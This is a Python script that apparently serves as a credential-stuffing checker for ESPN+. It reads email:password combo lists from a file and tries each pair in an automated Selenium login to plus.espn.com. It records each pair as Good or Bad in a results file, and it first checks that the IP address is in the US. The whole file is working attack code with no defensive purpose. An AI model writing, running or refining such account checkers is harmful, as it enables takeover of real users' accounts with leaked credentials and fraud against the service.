import time
import requests
from bs4 import BeautifulSoup as soup

from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path

file_directory = str(Path(__file__).parent)+'/espn+'
page = 'https://plus.espn.com/'
get_current_ip = 'https://www.iplocation.net/'
info_list =[]
request = requests.get(get_current_ip)
parse_request = soup(request.content,'html.parser')
get_Location = parse_request.find('table',attrs={'class':'iptable'})
location = get_Location.find_all('td')
for line in location:
	info_list.append(line.text.strip())
if 'US' not in info_list[2]:
	print('Non-US IP\nThe Program will only work for US IP Adresses.\nEnding.')
	exit()

users = []
passwords = []
#browser_options = Options()
#browser_options.headless = True


with open(file_directory, 'r') as espn:
	
	for line in espn.readlines():
		users.append(line.split(':')[0].strip())
		passwords.append(line.split(':')[1].strip())

for index in range(len(users)):

	with open('account_results','a') as account_results:
	
		try:
		
			browser = webdriver.Chrome()
			browser.set_window_size(500,700)
			browser.get(page)
			time.sleep(5)
			login_button = browser.find_element_by_xpath('//*[@id="root"]/nav/div[3]/button')
			login_button.click()
			browser.switch_to.frame(0)
			time.sleep(1)
			original_login = browser.find_element_by_xpath('/html/body/div[1]/div/div/footer/p/a')
			original_login.click()
			email_box = browser.find_element_by_xpath('/html/body/div[1]/div/div/section/section/form/section/div[1]/div/label/span[2]/input')
			email_box.send_keys(users[index])
			password_box = browser.find_element_by_xpath('/html/body/div[1]/div/div/section/section/form/section/div[2]/div/label/span[2]/input')
			password_box .send_keys(passwords[index])
			log_in = browser.find_element_by_xpath('//*[@id="did-ui-view"]/div/section/section/form/section/div[3]/button')
			log_in.click()
			time.sleep(6)
			invalid_email_text = browser.find_element_by_xpath('//*[@id="did-ui-view"]/div/section/div/div/div')
			error = invalid_email_text.text
			if 'The credentials you entered are incorrect' in str(error):
				account_results.write(users[index]+':'+passwords[index]+' ---> Bad \n')
			browser.close()
			
		except NoSuchElementException:
		
			account_results.write(users[index]+':'+passwords[index]+' ---> Good \n')
			browser.close()
			continue
			
		except ElementClickInterceptedException:
		
			print('Intercepted, ending.\n')
			print('(stopped at combo {} \n'.format(users[index], passwords[index]))
			break
			
		except Exception as e:
		
			print(e)
			print('(stopped at combo {} \n'.format(users[index], passwords[index]))
			break
